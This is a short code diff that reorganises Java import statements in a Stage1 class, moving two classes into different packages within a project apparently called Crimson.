@@ -30,11 +30,11 @@ import subterranean.crimson.permajar.stage1.network.Communications;
 import subterranean.crimson.permajar.stage2.Stage2;
 import subterranean.crimson.universal.FileLocking;
 import subterranean.crimson.universal.Logger;
+import subterranean.crimson.universal.ObjectTransfer;
 import subterranean.crimson.universal.Utilities;
 import subterranean.crimson.universal.containers.AddressSpec;
 import subterranean.crimson.universal.containers.Options;
-import subterranean.crimson.universal.objects.InvalidObjectException;
-import subterranean.crimson.universal.objects.ObjectTransfer;
+import subterranean.crimson.universal.exceptions.InvalidObjectException;
 
 public class Stage1 {
 
